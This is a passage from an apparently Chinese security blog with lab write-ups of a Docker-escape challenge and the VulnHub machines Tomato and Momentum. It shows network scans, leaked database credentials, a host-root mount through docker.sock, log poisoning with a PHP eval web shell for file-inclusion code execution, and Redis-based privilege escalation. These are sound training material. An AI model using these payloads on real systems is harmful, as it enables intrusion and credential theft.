</span></span><span style=display:flex><span>9:perf_event:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>8:blkio:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>7:freezer:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>6:devices:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>5:memory:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>4:cpuacct:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>3:cpu:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>2:cpuset:/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>hostname
</span></span><span style=display:flex><span>8f4bca8ef241
</span></span></code></pre></div><p>但是这个容器里没有docker逃逸的条件，先查一下ip：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ip addr
</span></span><span style=display:flex><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>65536</span> qdisc noqueue state UNKNOWN group default 
</span></span><span style=display:flex><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style=display:flex><span>    inet 127.0.0.1/8 scope host lo
</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
</span></span><span style=display:flex><span>9: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style=color:#ae81ff>1500</span> qdisc noqueue state UP group default 
</span></span><span style=display:flex><span>    link/ether 02:42:ac:12:00:04 brd ff:ff:ff:ff:ff:ff
</span></span><span style=display:flex><span>    inet 172.18.0.4/16 scope global eth0
</span></span><span style=display:flex><span>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>蚁剑传fscan运行：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>./fscan -h 172.18.0.0/24
</span></span><span style=display:flex><span>cat result.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>172.18.0.4:3306 open
</span></span><span style=display:flex><span>172.18.0.3:80 open
</span></span><span style=display:flex><span>172.18.0.2:22 open
</span></span><span style=display:flex><span>172.18.0.1:22 open
</span></span><span style=display:flex><span>172.18.0.1:8000 open
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> WebTitle http://172.18.0.1:8000    code:200 len:71264  title:NotSoEasy Docker &amp;<span style=color:#75715e>#8211; Just another WordPress site</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> WebTitle http://172.18.0.3         code:200 len:71044  title:NotSoEasy Docker &amp;<span style=color:#75715e>#8211; Just another WordPress site</span>
</span></span></code></pre></div><p>172.18.0.1 是容器 172.18.0.3 的网关，172.18.0.4:3306 是 wordpress 的数据库服务</p><p>wp-config.php：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** The name of the database for WordPress */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_NAME&#39;</span>, <span style=color:#e6db74>&#39;wordpress&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database username */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_USER&#39;</span>, <span style=color:#e6db74>&#39;wordpress&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL database password */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_PASSWORD&#39;</span>, <span style=color:#e6db74>&#39;WordPressISBest&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** MySQL hostname */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_HOST&#39;</span>, <span style=color:#e6db74>&#39;db:3306&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** Database Charset to use in creating database tables. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_CHARSET&#39;</span>, <span style=color:#e6db74>&#39;utf8&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#39;DB_COLLATE&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>);
</span></span></code></pre></div><p>可以连上mysql服务器，但是没找到什么有用的信息，再扫一下 172.18.0.2 全端口：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>./fscan -h 172.18.0.2 -p 1-65535
</span></span><span style=display:flex><span>172.18.0.2:22 open
</span></span><span style=display:flex><span>172.18.0.2:8022 open
</span></span></code></pre></div><p>proxyfier配置好代理可以直接访问8022端口的web服务，权限为root的一个 docker ssh：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>find / -name docker.sock
</span></span><span style=display:flex><span>/run/docker.sock
</span></span></code></pre></div><p>容器内安装docker，需要换源，后续利用docker.sock挂载主机根目录到 tmp 目录下即可找到flag_3：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>docker run -it --rm -v /:/tmp/1 wordpress /bin/bash
</span></span></code></pre></div><p>参考资料：</p><p><a href=https://cloud.tencent.com/developer/news/378799>https://cloud.tencent.com/developer/news/378799</a></p><p><a href=https://strcpy.me/index.php/archives/775/>https://strcpy.me/index.php/archives/775/</a></p><h2 id=vulnhub-tomato>vulnhub Tomato<a hidden class=anchor aria-hidden=true href=#vulnhub-tomato>#</a></h2><p>nmap探测靶机ip：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.130
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00024s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE
</span></span><span style=display:flex><span>21/tcp   open  ftp
</span></span><span style=display:flex><span>80/tcp   open  http
</span></span><span style=display:flex><span>8888/tcp open  sun-answerbook
</span></span></code></pre></div><p>nmap进一步全端口扫描，获取版本信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ sudo nmap 61.139.2.130 -sV -sS -p- --min-rate <span style=color:#ae81ff>10000</span>
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-12-09 12:30 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.130
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.0012s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65531</span> closed tcp ports <span style=color:#f92672>(</span>reset<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>21/tcp   open  ftp     vsftpd 3.0.3
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8888/tcp open  http    nginx 1.10.3 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>MAC Address: 00:0C:29:62:FB:52 <span style=color:#f92672>(</span>VMware<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 8.84 seconds
</span></span></code></pre></div><p>dirsearch只能扫出403的页面，用dirb再扫一遍：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ dirb http://61.139.2.130:80                    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>DIRB v2.22    
</span></span><span style=display:flex><span>By The Dark Raver
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>START_TIME: Tue Dec  <span style=color:#ae81ff>9</span> 12:32:34 <span style=color:#ae81ff>2025</span>
</span></span><span style=display:flex><span>URL_BASE: http://61.139.2.130:80/
</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>4612</span>                                                          
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---- Scanning URL: http://61.139.2.130:80/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://61.139.2.130:80/antibot_image/                                                                                                         
</span></span><span style=display:flex><span>+ http://61.139.2.130:80/index.html <span style=color:#f92672>(</span>CODE:200|SIZE:652<span style=color:#f92672>)</span>                                                                                                      
</span></span><span style=display:flex><span>+ http://61.139.2.130:80/server-status <span style=color:#f92672>(</span>CODE:403|SIZE:277<span style=color:#f92672>)</span>                                                                                                   
</span></span><span style=display:flex><span>                                                                                                                                                             
</span></span><span style=display:flex><span>---- Entering directory: http://61.139.2.130:80/antibot_image/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                                                                               
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>END_TIME: Tue Dec  <span style=color:#ae81ff>9</span> 12:32:37 <span style=color:#ae81ff>2025</span>
</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ae81ff>4612</span> - FOUND: <span style=color:#ae81ff>2</span>
</span></span></code></pre></div><p>目录 <code>antibot_image/antibots/info.php</code> 中有一段注释：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;!--</span> <span style=color:#f92672>&lt;/?</span><span style=color:#a6e22e>php</span> <span style=color:#66d9ef>include</span> $_GET[<span style=color:#e6db74>&#39;image&#39;</span>]; <span style=color:#f92672>--&gt;</span>
</span></span></code></pre></div><p>include文件包含先尝试获取/etc/passwd：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span style=display:flex><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span style=display:flex><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>syslog:x:104:108::/home/syslog:/bin/false
</span></span><span style=display:flex><span>_apt:x:105:65534::/nonexistent:/bin/false
</span></span><span style=display:flex><span>messagebus:x:106:110::/var/run/dbus:/bin/false
</span></span><span style=display:flex><span>uuidd:x:107:111::/run/uuidd:/bin/false
</span></span><span style=display:flex><span>tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash
</span></span><span style=display:flex><span>sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>ftp:x:109:117:ftp daemon,,,:/srv/ftp:/bin/false
</span></span></code></pre></div><p>网上wp有说通过ssh用户名污染ssh日志的，但是我在实际利用时会报错 <code>remote username contains invalid characters</code> 导致无法ssh连接，但是构造恶意用户名实现污染8888端口http服务的nginx日志，再用include包含一句话木马getshell是可以成功的，访问8888端口时使用用户名：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#f92672>@</span><span style=color:#66d9ef>eval</span>($_REQUEST[<span style=color:#ae81ff>1</span>]);<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>蚁剑连接 http://127.0.0.1:8085/antibot_image/antibots/info.php?image=/var/log/nginx/error.log</p><p>后续内核提权 <a href=https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.4.0-21-generic/CVE-2017-6074>https://github.com/kkamagui/linux-kernel-exploits/tree/master/kernel-4.4.0-21-generic/CVE-2017-6074</a>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#f92672>(</span>www-data:/<span style=color:#f92672>)</span> $ uname -a
</span></span><span style=display:flex><span>Linux ubuntu 4.4.0-21-generic <span style=color:#75715e>#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h2 id=vulnhub-momentum>vulnhub Momentum<a hidden class=anchor aria-hidden=true href=#vulnhub-momentum>#</a></h2><p>nmap发现服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.129
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00050s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>靶机ip：61.139.2.129，指定扫描端口22,80，显示版本信息，半开放扫描：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ sudo nmap 61.139.2.129 -p 22,80 -sV -sS --min-rate <span style=color:#ae81ff>10000</span>
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-12-08 15:18 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.129
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00038s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>MAC Address: 00:0C:29:DF:99:67 <span style=color:#f92672>(</span>VMware<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 6.56 seconds
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/11.png></p><p>dirsearch目录扫描：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ dirsearch -u http://61.139.2.129 --random-agent
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Target: http://61.139.2.129/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:25<span style=color:#f92672>]</span> Starting:                                                                                                                                          
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:25<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  309B  - /js  -&gt;  http://61.139.2.129/js/                  
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess.bak1                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess.save
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess.sample                                 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess.orig                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess_extra                                  
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess_orig
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccessBAK
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccessOLD2
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccess_sc                                     
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htaccessOLD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.html                                            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htm                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htpasswd_test                                   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.httr-oauth                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.htpasswds                                       
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:27<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.php                                             
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:28<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /.ht_wsr.txt                                      
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:35<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  310B  - /css  -&gt;  http://61.139.2.129/css/                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  310B  - /img  -&gt;  http://61.139.2.129/img/                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:39<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -  451B  - /js/                                              
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:40<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  313B  - /manual  -&gt;  http://61.139.2.129/manual/          
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:40<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -  201B  - /manual/index.html                                
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /server-status                                    
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>15:25:45<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /server-status/
</span></span></code></pre></div><p>可以看出是php写的网站，并且大部分没有权限访问都是403，<code>/js</code>可能有些价值，main.js：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>viewDetails</span>(<span style=color:#a6e22e>str</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  window.<span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;opus-details.php?id=&#34;</span><span style=color:#f92672>+</span><span style=color:#a6e22e>str</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>var CryptoJS = require(&#34;crypto-js&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>var decrypted = CryptoJS.AES.decrypt(encrypted, &#34;SecretPassphraseMomentum&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>console.log(decrypted.toString(CryptoJS.enc.Utf8));
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></div><p>虽然被注释了，但是后端可能有个AES解密的服务，并且泄露了AES密钥，访问opus-details.php，Cookie值明显是AES加密过的，解密看看：</p><pre tabindex=0><code>cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
</code></pre><p><img alt=alt loading=lazy src=/images/vulnhub/12.png></p><p>尝试ssh连接，用户名是<code>auxerre</code>，密码是<code>auxerre-alienum##</code>，当前用户目录下user.txt中就有第一个flag：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>auxerre@Momentum:~$ cat user.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Momentum - User Owned <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>---------------------------------------
</span></span><span style=display:flex><span>flag : 84157165c30ad34d18945b647ec7f647
</span></span><span style=display:flex><span>---------------------------------------
</span></span></code></pre></div><p>尝试suid提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>auxerre@Momentum:~$ find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/usr/bin/mount
</span></span><span style=display:flex><span>/usr/bin/chsh
</span></span><span style=display:flex><span>/usr/bin/gpasswd
</span></span><span style=display:flex><span>/usr/bin/su
</span></span><span style=display:flex><span>/usr/bin/umount
</span></span><span style=display:flex><span>/usr/bin/passwd
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign
</span></span></code></pre></div><p>没有可利用的命令，查看所有进程，发现有个redis的服务开放在6379端口：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>auxerre@Momentum:~$ redis-cli
</span></span><span style=display:flex><span>127.0.0.1:6379&gt; PING
</span></span><span style=display:flex><span>PONG
</span></span><span style=display:flex><span>127.0.0.1:6379&gt; KEYS *
</span></span><span style=display:flex><span>1<span style=color:#f92672>)</span> <span style=color:#e6db74>&#34;rootpass&#34;</span>
</span></span><span style=display:flex><span>127.0.0.1:6379&gt; GET rootpass
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;m0mentum-al1enum##&#34;</span>
</span></span><span style=display:flex><span>127.0.0.1:6379&gt;
</span></span></code></pre></div><p>su切换root用户完成提权：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>root@Momentum:~# cat root.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> Momentum - Rooted <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>---------------------------------------
</span></span><span style=display:flex><span>Flag : 658ff660fdac0b079ea78238e5996e40
</span></span><span style=display:flex><span>---------------------------------------
